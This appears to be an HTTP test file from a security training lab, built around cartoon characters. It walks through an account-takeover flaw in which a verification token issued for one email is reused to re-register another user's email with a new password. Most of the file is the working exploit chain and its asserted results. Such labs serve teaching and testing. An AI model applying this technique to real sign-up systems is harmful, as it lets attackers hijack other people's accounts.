# @import ../common/setup.http
@base = {{base_host}}/v106
@mailpit = http://127.0.0.1:8025/api/v1

### Sandy adds a new feature before deployement: now new users can be registered.
# SpongeBob is a registered user and he can login as usual
GET {{base}}/account/info
Authorization: {{spongebob_auth_email}}

?? status == 200

### If Plankton tries to register as SpongeBob, but it will fail because the email is taken
POST {{base}}/auth/register
Content-Type: application/json

{
    "email": "spongebob@bikinibottom.sea"
}

?? status == 400
?? js response.parsedBody.message == email already taken

### So, Plankton registers a sock puppet account to get a valid token
# @name register_request
POST {{base}}/auth/register
Content-Type: application/json

{ "email": "plankton.jr@chum-bucket.sea" }

?? status == 200

### This request succeeds and sends a verification email to provided email
GET {{mailpit}}/messages?limit=1

{{
  const messages = response.parsedBody.messages;
  exports.message_id = messages[0].ID;
}}

?? status == 200

### 
GET {{mailpit}}/message/{{message_id}}

{{
  const body = response.parsedBody.Body || response.parsedBody.Text;
  const tokenMatch = body.match(/token=([a-zA-Z0-9\-_.]+)/);
  exports.token = tokenMatch ? tokenMatch[1] : "";
}}

?? status == 200

### Plankton submits his valid token but specifies SpongeBob's email, hijacking his account
# @name exploit
POST {{base}}/auth/register
Content-Type: application/json

{
    "token": "{{token}}",
    "email": "spongebob@bikinibottom.sea",
    "password": "hijacked",
    "name": "SpongeBob"
}

?? status == 200

### Plankton can now login as SpongeBob with his chosen password
GET {{base}}/account/info
Authorization: Basic spongebob@bikinibottom.sea:hijacked

?? status == 200
?? js response.parsedBody.email == spongebob@bikinibottom.sea

### Now SpongeBob cannot login into his account!
GET {{base}}/account/info
Authorization: {{spongebob_auth_email}}

?? status == 401
?? js response.parsedBody.error == User authentication required
